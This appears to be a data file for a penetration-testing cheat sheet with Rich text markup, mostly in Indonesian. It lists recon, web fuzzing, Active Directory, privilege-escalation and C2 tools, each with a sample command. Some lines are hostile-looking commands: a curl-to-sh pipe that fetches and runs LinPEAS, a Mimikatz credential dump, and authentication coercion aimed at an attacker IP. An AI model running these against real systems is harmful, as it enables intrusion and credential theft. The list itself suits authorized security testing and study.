"1. Reconnaissance & OSINT (Recon)":
  - "[bold cyan]Amass[/bold cyan]: In-depth DNS enumeration and network mapping. [bold green]Contoh:[/bold green] [italic]amass enum -d example.com[/italic]"
  - "[bold cyan]Subfinder[/bold cyan]: Fast passive subdomain discovery. [bold green]Contoh:[/bold green] [italic]subfinder -d example.com[/italic]"
  - "[bold cyan]Assetfinder[/bold cyan]: Tool simpel untuk mencari domains dan subdomains. [bold green]Contoh:[/bold green] [italic]assetfinder --subs-only example.com[/italic]"
  - "[bold cyan]Findomain[/bold cyan]: Fast cross-platform subdomain enumerator. [bold green]Contoh:[/bold green] [italic]findomain -t example.com[/italic]"
  - "[bold cyan]httpx[/bold cyan]: Fast and multi-purpose HTTP toolkit. [bold green]Contoh:[/bold green] [italic]cat subs.txt | httpx -sc -title[/italic]"
  - "[bold cyan]httprobe[/bold cyan]: Probing list domain. [bold green]Contoh:[/bold green] [italic]cat subs.txt | httprobe[/italic]"
  - "[bold cyan]Naabu[/bold cyan]: Fast port scanner ditulis dalam Go. [bold green]Contoh:[/bold green] [italic]naabu -host example.com[/italic]"
  - "[bold cyan]RustScan[/bold cyan]: Port scanner masa kini, jauh lebih cepat dari Nmap. [bold green]Contoh:[/bold green] [italic]rustscan -a target.com -- -A[/italic]"
  - "[bold cyan]Masscan[/bold cyan]: TCP port scanner asinkron. [bold green]Contoh:[/bold green] [italic]masscan -p1-65535 192.168.1.0/24 --rate=1000[/italic]"
  - "[bold cyan]Gau (GetAllUrls)[/bold cyan]: Fetch known URLs. [bold green]Contoh:[/bold green] [italic]gau example.com[/italic]"
  - "[bold cyan]Waybackurls[/bold cyan]: Ambil semua historical URL. [bold green]Contoh:[/bold green] [italic]echo example.com | waybackurls[/italic]"
  - "[bold cyan]Katana[/bold cyan]: Next-generation crawling. [bold green]Contoh:[/bold green] [italic]katana -u https://example.com[/italic]"
  - "[bold cyan]Hakrawler[/bold cyan]: Web crawler super cepat. [bold green]Contoh:[/bold green] [italic]echo https://example.com | hakrawler[/italic]"
  - "[bold cyan]Shodan CLI[/bold cyan]: Mesin pencari IoT/Device. [bold green]Contoh:[/bold green] [italic]shodan search \"port:23\"[/italic]"
  - "[bold cyan]Censys[/bold cyan]: Attack surface management. [bold green]Contoh:[/bold green] [italic]censys search \"services.port: 80\"[/italic]"
  - "[bold cyan]Aquatone[/bold cyan]: Screenshotting otomatis. [bold green]Contoh:[/bold green] [italic]cat urls.txt | aquatone -out out_dir[/italic]"
  - "[bold cyan]Eyewitness[/bold cyan]: Screenshotting tool andalan. [bold green]Contoh:[/bold green] [italic]eyewitness -f urls.txt --web[/italic]"
  - "[bold cyan]MassDNS[/bold cyan]: High-performance DNS resolver. [bold green]Contoh:[/bold green] [italic]massdns -r resolvers.txt -t A domains.txt[/italic]"
  - "[bold cyan]Altdns[/bold cyan]: Generator permutasi. [bold green]Contoh:[/bold green] [italic]altdns -i subs.txt -o out.txt -w words.txt[/italic]"

"2. Web Application Vulnerability & Fuzzing":
  - "[bold cyan]Burp Suite Professional[/bold cyan]: Proxy and scanner. [bold green]Contoh:[/bold green] [italic](GUI Tool) Start and set browser proxy to 127.0.0.1:8080[/italic]"
  - "[bold cyan]Caido[/bold cyan]: Lightweight proxy modern. [bold green]Contoh:[/bold green] [italic](GUI Tool) caido-cli or run desktop app[/italic]"
  - "[bold cyan]Nuclei[/bold cyan]: Fast vulnerability scanner. [bold green]Contoh:[/bold green] [italic]nuclei -u https://example.com -t cves/[/italic]"
  - "[bold cyan]Ffuf[/bold cyan]: Fast web fuzzer. [bold green]Contoh:[/bold green] [italic]ffuf -w words.txt -u https://example.com/FUZZ[/italic]"
  - "[bold cyan]Feroxbuster[/bold cyan]: Content discovery tool. [bold green]Contoh:[/bold green] [italic]feroxbuster -u https://example.com[/italic]"
  - "[bold cyan]Gobuster[/bold cyan]: Directory busting. [bold green]Contoh:[/bold green] [italic]gobuster dir -u https://example.com -w words.txt[/italic]"
  - "[bold cyan]Dirsearch[/bold cyan]: Web path scanner. [bold green]Contoh:[/bold green] [italic]dirsearch -u https://example.com[/italic]"
  - "[bold cyan]Dalfox[/bold cyan]: XSS Scanning super ganas. [bold green]Contoh:[/bold green] [italic]dalfox url \"https://example.com?q=test\"[/italic]"
  - "[bold cyan]XSStrike[/bold cyan]: Advanced XSS detection. [bold green]Contoh:[/bold green] [italic]python3 xsstrike.py -u \"https://example.com?q=test\"[/italic]"
  - "[bold cyan]Arjun[/bold cyan]: HTTP parameter discovery. [bold green]Contoh:[/bold green] [italic]arjun -u https://example.com/endpoint[/italic]"
  - "[bold cyan]ParamSpider[/bold cyan]: Parameter discovery. [bold green]Contoh:[/bold green] [italic]python3 paramspider.py -d example.com[/italic]"
  - "[bold cyan]SQLmap[/bold cyan]: Automatic SQL injection. [bold green]Contoh:[/bold green] [italic]sqlmap -u \"https://example.com?id=1\" --dbs[/italic]"
  - "[bold cyan]Ghauri[/bold cyan]: Advanced SQLi tool. [bold green]Contoh:[/bold green] [italic]ghauri -u \"https://example.com?id=1\" --dbs[/italic]"
  - "[bold cyan]Commix[/bold cyan]: OS command injection. [bold green]Contoh:[/bold green] [italic]commix --url=\"https://example.com?id=INJECT_HERE\"[/italic]"
  - "[bold cyan]Wfuzz[/bold cyan]: Web fuzzing kompleks. [bold green]Contoh:[/bold green] [italic]wfuzz -c -z file,words.txt https://example.com/FUZZ[/italic]"
  - "[bold cyan]GraphQL-cop[/bold cyan]: GraphQL misconfig. [bold green]Contoh:[/bold green] [italic]python3 graphql-cop.py -u https://example.com/graphql[/italic]"
  - "[bold cyan]JWT_Tool[/bold cyan]: Toolkit pro JWT. [bold green]Contoh:[/bold green] [italic]python3 jwt_tool.py <token> -M pb[/italic]"
  - "[bold cyan]CRLFuzz[/bold cyan]: CRLF scanner. [bold green]Contoh:[/bold green] [italic]crlfuzz -u https://example.com[/italic]"
  - "[bold cyan]Smuggler[/bold cyan]: HTTP Smuggling. [bold green]Contoh:[/bold green] [italic]python3 smuggler.py -u https://example.com[/italic]"

"3. Network Security & Active Directory":
  - "[bold cyan]CrackMapExec (NetExec)[/bold cyan]: Swiss army knife. [bold green]Contoh:[/bold green] [italic]nxc smb 192.168.1.0/24 -u user -p pass[/italic]"
  - "[bold cyan]BloodHound[/bold cyan]: AD path visualization. [bold green]Contoh:[/bold green] [italic]Run Neo4j, then ingest data using SharpHound.exe -c All[/italic]"
  - "[bold cyan]Responder[/bold cyan]: LLMNR/NBT-NS poisoner. [bold green]Contoh:[/bold green] [italic]sudo responder -I eth0 -rdw[/italic]"
  - "[bold cyan]Impacket[/bold cyan]: Network protocols script. [bold green]Contoh:[/bold green] [italic]psexec.py domain.local/user:pass@192.168.1.10[/italic]"
  - "[bold cyan]Nmap[/bold cyan]: Port scanner. [bold green]Contoh:[/bold green] [italic]nmap -sC -sV -p- 192.168.1.10[/italic]"
  - "[bold cyan]Enum4linux-ng[/bold cyan]: Enumerasi SMB. [bold green]Contoh:[/bold green] [italic]enum4linux-ng -A 192.168.1.10[/italic]"
  - "[bold cyan]Kerbrute[/bold cyan]: Enumerasi Kerberos. [bold green]Contoh:[/bold green] [italic]kerbrute userenum -d domain.local users.txt[/italic]"
  - "[bold cyan]Rubeus[/bold cyan]: Manipulasi Kerberos. [bold green]Contoh:[/bold green] [italic]Rubeus.exe kerberoast /outfile:hashes.txt[/italic]"
  - "[bold cyan]Certipy[/bold cyan]: Abuse ADCS. [bold green]Contoh:[/bold green] [italic]certipy find -vulnerable -u user@domain.local -p pass -dc-ip 10.10.10.10[/italic]"
  - "[bold cyan]Coercer[/bold cyan]: Coerce authentication. [bold green]Contoh:[/bold green] [italic]coercer coerce -u user -p pass -d domain -l <attacker-ip> -t <target>[/italic]"
  - "[bold cyan]PetitPotam[/bold cyan]: MS-EFSRPC exploit. [bold green]Contoh:[/bold green] [italic]python3 PetitPotam.py <attacker-ip> <target-ip>[/italic]"

"4. Privilege Escalation & Pivoting":
  - "[bold cyan]LinPEAS[/bold cyan]: PrivEsc di Linux. [bold green]Contoh:[/bold green] [italic]curl -L https://peass-ng.github.io/linPEAS | sh[/italic]"
  - "[bold cyan]WinPEAS[/bold cyan]: PrivEsc di Windows. [bold green]Contoh:[/bold green] [italic]winPEASany.exe quiet cmd fast[/italic]"
  - "[bold cyan]Traitor[/bold cyan]: Exploit otomatis Linux. [bold green]Contoh:[/bold green] [italic]traitor -a[/italic]"
  - "[bold cyan]Seatbelt[/bold cyan]: Miskonfigurasi Windows. [bold green]Contoh:[/bold green] [italic]Seatbelt.exe all[/italic]"
  - "[bold cyan]Pspy[/bold cyan]: Monitor Linux processes. [bold green]Contoh:[/bold green] [italic]./pspy64 -pf -i 1000[/italic]"
  - "[bold cyan]Chisel[/bold cyan]: TCP/UDP tunnel over HTTP. [bold green]Contoh:[/bold green] [italic]chisel server -p 8000 --reverse[/italic]"
  - "[bold cyan]Ligolo-ng[/bold cyan]: Advanced tunneling. [bold green]Contoh:[/bold green] [italic]sudo ip tuntap add user kalimode tun ligolo; ./proxy[/italic]"
  - "[bold cyan]PrintSpoofer[/bold cyan]: Service Account to SYSTEM. [bold green]Contoh:[/bold green] [italic]PrintSpoofer.exe -i -c cmd[/italic]"
  - "[bold cyan]GodPotato[/bold cyan]: Potato family exploit. [bold green]Contoh:[/bold green] [italic]GodPotato.exe -cmd \"cmd.exe /c whoami\"[/italic]"
  - "[bold cyan]Mimikatz[/bold cyan]: Dump credentials. [bold green]Contoh:[/bold green] [italic]mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit[/italic]"
  - "[bold cyan]Sudo_killer[/bold cyan]: Eksploitasi sudo. [bold green]Contoh:[/bold green] [italic]./sudo_killer.sh -c -e -r report.txt[/italic]"

"5. Post-Exploitation & Command/Control (C2)":
  - "[bold cyan]Cobalt Strike[/bold cyan]: Red Teaming framework. [bold green]Contoh:[/bold green] [italic]./teamserver <server-ip> <password>[/italic]"
  - "[bold cyan]Sliver[/bold cyan]: C2 open-source Go. [bold green]Contoh:[/bold green] [italic]sliver-server; lalu jalankan: generate --http <IP>[/italic]"
  - "[bold cyan]Mythic[/bold cyan]: Framework C2 modern. [bold green]Contoh:[/bold green] [italic]sudo ./mythic-cli start[/italic]"
  - "[bold cyan]Havoc[/bold cyan]: C2 framework bypass EDR. [bold green]Contoh:[/bold green] [italic]./havoc server --profile profiles/havoc.yaotl -v[/italic]"
  - "[bold cyan]Metasploit Framework[/bold cyan]: Exploitation framework. [bold green]Contoh:[/bold green] [italic]msfconsole -q; use exploit/multi/handler[/italic]"
  - "[bold cyan]Covenant[/bold cyan]: C2 berbasis .NET. [bold green]Contoh:[/bold green] [italic]dotnet run (Buka web UI di port 7443)[/italic]"
  - "[bold cyan]Empire[/bold cyan]: PowerShell/Python post-exploit. [bold green]Contoh:[/bold green] [italic]./ps-empire server[/italic]"
  - "[bold cyan]PoshC2[/bold cyan]: Proxy-aware C2 PowerShell. [bold green]Contoh:[/bold green] [italic]posh-project -n new_project[/italic]"
  - "[bold cyan]Merlin[/bold cyan]: HTTP/2 C2 server. [bold green]Contoh:[/bold green] [italic]sudo ./merlinServer -i 0.0.0.0[/italic]"
